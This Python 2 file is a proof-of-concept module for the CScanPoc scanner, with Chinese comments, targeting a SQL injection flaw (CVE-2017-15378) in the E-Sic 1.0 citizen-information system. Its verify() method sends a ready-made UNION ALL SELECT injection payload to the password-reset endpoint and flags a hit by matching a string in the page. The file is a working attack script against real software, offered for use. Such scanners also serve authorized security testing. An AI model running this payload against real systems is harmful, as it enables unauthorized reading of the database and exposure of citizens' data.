# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'CNVD-2018-10603' # 平台漏洞编号
    name = 'E-Sic SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2018-05-30'  # 漏洞公布时间
    desc = '''模版漏洞描述
    E-Sic是巴西的一套公民信息电子系统。 
    E-Sic 1.0版本中存在SQL注入漏洞。远程攻击者可利用该漏洞执行任意的SQL命令。 
    ''' # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-10603' # 漏洞来源
    cnvd_id = 'CNVD-2018-10603' # cnvd漏洞编号
    cve_id = 'CVE-2017-15378 '  # cve编号
    product = 'E-Sic'  # 漏洞组件名称
    product_version = 'E-Sic 1.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6689f923-61a4-42b0-8d44-07b8c9a4cead' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-07-09' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = self.target + "/esic/reset/"
            data = "cpfcnpj=test' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qbqqq','HMDStbPURehioEoBDmsawJnddTBZoNxMrwIeJWFR'),'qzbpq'),NULL,NULL--GJkR&btsub=Enviar"
            _response = requests.post(payload, data=data)
            if "Informe seu CPF ou CNPJ para enviarmos nova senha:" in _response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
